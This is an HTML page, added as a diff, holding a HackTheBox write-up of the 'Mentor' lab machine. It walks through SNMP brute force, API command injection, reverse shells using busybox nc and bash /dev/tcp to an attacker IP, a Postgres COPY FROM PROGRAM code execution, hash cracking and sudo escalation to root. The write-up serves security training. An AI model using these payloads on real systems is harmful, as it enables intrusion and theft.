@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/mentor.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Mentor - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-medium">medium</span>
+                    <span class="article-cat">· linux / api</span>
+                </div>
+
+                <h1>Mentor</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Mentor</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">API</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">snmp community brute</span>
+                    <span class="tag">leaked snmp credential</span>
+                    <span class="tag">api command injection</span>
+                    <span class="tag">postgres copy from program rce</span>
+                    <span class="tag">snmpd.conf sudo privesc</span>
+                </div>
+
+                <img src="../../images/hackthebox/mentor/index.png" alt="Mentor Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Only 22 and 80 are open. Port 80 is not a plain Apache page, the server header leaks a Werkzeug/Python backend, so there is a Flask app behind it.</p>
+
+                <pre><code>[Mentor] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -v -oN nmap_tcp mentorquotes.htb
+Nmap scan report for mentorquotes.htb (10.129.228.102)
+Host is up (0.22s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+| http-methods:
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: MentorQuotes
+| http-server-header:
+|   Apache/2.4.52 (Ubuntu)
+|_  Werkzeug/2.0.3 Python/3.6.9
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The site is titled <strong>MentorQuotes</strong> and points at <code>mentorquotes.htb</code>, which I added to <code>/etc/hosts</code>. The front page references an API host, so I added <code>api.mentorquotes.htb</code> as well. The API is a FastAPI app with Swagger docs at <code>http://api.mentorquotes.htb/docs</code>, and among the routes are a few admin ones:</p>
+
+                <pre><code>http://api.mentorquotes.htb/admin/
+http://api.mentorquotes.htb/admin/backup
+http://api.mentorquotes.htb/admin/check</code></pre>
+
+                <p>You can self register an account, but the token it hands back is not privileged enough to reach any of the admin endpoints, so the HTTP surface stalls here. Falling back to a UDP scan turns up <code>161/udp</code> (SNMP) open, which is the way in.</p>
+
+                <p>SNMP with an unknown community string is a brute force problem. I used SECFORCE's <a href="https://github.com/SECFORCE/SNMP-Brute">SNMP-Brute</a> to recover the valid communities:</p>
+
+                <pre><code>[Mentor] python snmpbrute.py -t mentorquotes.htb
+
+Identified Community strings
+    0) 10.129.228.102  public (v1)(RO)
+    1) 10.129.228.102  public (v2c)(RO)
+    2) 10.129.228.102  internal (v2c)(RO)</code></pre>
+
+                <p>The <code>public</code> community only leaks the admin contact email. The <code>internal</code> community is the interesting one. Walking the running process table exposes the argument a login script was started with:</p>
+
+                <pre><code>[Mentor] snmpwalk -v2c -c internal mentorquotes.htb
+...
+iso.3.6.1.2.1.25.4.2.1.5.2114 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p>That trailing token, <code>kj23sadkj123as0-d213</code>, is a password passed to a login script on the command line. The API exposes the account list, which includes <code>admin@mentorquotes.htb</code> and <code>james@mentorquotes.htb</code>. The string does not authenticate <code>admin</code>, but it works for <code>james</code>, and the API returns a signed JWT for him.</p>
+
+                <p>The JWT payload decodes to james' identity:</p>
+
+                <pre><code>{"username":"james","email":"james@mentorquotes.htb"}</code></pre>
+
+                <p>With james' token the admin routes open up. The <code>/admin/backup</code> endpoint takes a JSON <code>path</code> parameter and drops it straight into a shell command, so it is a trivial command injection. I fed it a <code>busybox nc</code> reverse shell:</p>
+
+                <pre><code>[Mentor] curl http://api.mentorquotes.htb/admin/backup \
+  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
+  -H 'Content-Type: application/json' \
+  -X POST -d '{"path":"$(busybox nc 10.10.15.108 4444 -e sh)"}'</code></pre>
+
+                <p>The listener catches a shell, but it lands inside a Docker container, not the host.</p>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Inside the API container, the database configuration hands over Postgres credentials and points at a gateway address on the Docker network:</p>
+
+                <pre><code>/ # cat /app/app/db.py
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")</code></pre>
+
+                <p>Scanning the internal Docker subnet with <code>cdk</code> shows several hosts, including a Postgres on the gateway itself:</p>
+
+                <pre><code>/ # ./cdk_linux_amd64 probe 172.22.0.1-254 1-10000 50 1000
+open : 172.22.0.1:81
+open : 172.22.0.1:80
+open : 172.22.0.1:22
+open : 172.22.0.1:5432
+open : 172.22.0.1:8000
+open : 172.22.0.2:80
+open : 172.22.0.3:8000
+open : 172.22.0.4:5432</code></pre>
+
+                <p>Postgres is not reachable from my machine, so I tunnelled it back over <code>chisel</code>. The server runs on my box in reverse mode, the client runs inside the container and forwards the gateway's 5432 to me:</p>
+
+                <pre><code>[Mentor] ./chisel server -p 12312 --reverse
+/ # ./chisel client 10.10.15.108:12312 R:5432:172.22.0.1:5432</code></pre>
+
+                <p>The leaked <code>postgres:postgres</code> credentials log straight into the tunnelled instance. A superuser Postgres session gives command execution through <code>COPY ... FROM PROGRAM</code>, so I wrote a reverse shell out, made it executable, and ran it:</p>
+
+                <pre><code>[Mentor] psql -U postgres -d postgres -h localhost -p 5432
+
+postgres=# COPY cmd_exec FROM PROGRAM 'echo "bash -i &gt;&amp; /dev/tcp/10.10.15.108/9999 0&gt;&amp;1" &gt; /tmp/shell.sh';
+postgres=# COPY cmd_exec FROM PROGRAM 'chmod +x /tmp/shell.sh';
+postgres=# COPY cmd_exec FROM PROGRAM 'bash /tmp/shell.sh';</code></pre>
+
+                <p>This lands in the Postgres container. The postgres user's <code>.bash_history</code> mentions a <code>pg_backup</code> directory, which turns out to hold a database dump owned by root:</p>
+
+                <pre><code>postgres@96e44c569292:~$ find / -name 'pg_backup' 2>/dev/null
+/var/lib/postgresql/data/pg_backup
+postgres@96e44c569292:~$ ls -la /var/lib/postgresql/data/pg_backup
+-rw-r--r-- 1 root root 5543 Nov 11  2022 db_export.sql</code></pre>
+
+                <p>The dump contains the users table with two MD5 password hashes:</p>
+
+                <pre><code>COPY public.users (id, email, username, password) FROM stdin;
+1	james@mentorquotes.htb	james	7ccdcd8c05b59add9c198d492b36a503
+35	svc@mentorquotes.htb	service_acc	53f22d0dfa10dce7e29cd31f4f953fd8
+\.</code></pre>
+
+                <p>James' hash resists rockyou, but the service account's cracks instantly:</p>
+
+                <pre><code>[Mentor] hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
+53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani</code></pre>
+
+                <p>There is an <code>svc</code> account on the actual host, and the recovered password gets me an SSH session as that user, which is the first real foothold on the box and the user flag.</p>
+
+                <pre><code>[Mentor] ssh svc@mentorquotes.htb
+svc@mentor:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Running an enumeration pass as <code>svc</code>, the SNMP daemon config on the host is world readable and stores a credential for the SNMPv3 bootstrap user:</p>
+
+                <pre><code>svc@mentor:~$ cat /etc/snmp/snmpd.conf
+rocommunity  public default -V systemonly
+rocommunity6 public default -V systemonly
+createUser bootstrap MD5 SuperSecurePassword123__ DES</code></pre>
+
+                <p>That password, <code>SuperSecurePassword123__</code>, does not work for root, but it does for <code>james</code>. And james has a very generous sudo rule:</p>
+
+                <pre><code>svc@mentor:~$ su james
+Password: SuperSecurePassword123__
+james@mentor:~$ sudo -l
+User james may run the following commands on mentor:
+    (ALL) /bin/sh</code></pre>
+
+                <p>James can run <code>/bin/sh</code> as anyone, so a single <code>sudo</code> drops a root shell, and root.txt is one <code>cat</code> away.</p>
+
+                <pre><code>james@mentor:~$ sudo /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Mentor</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
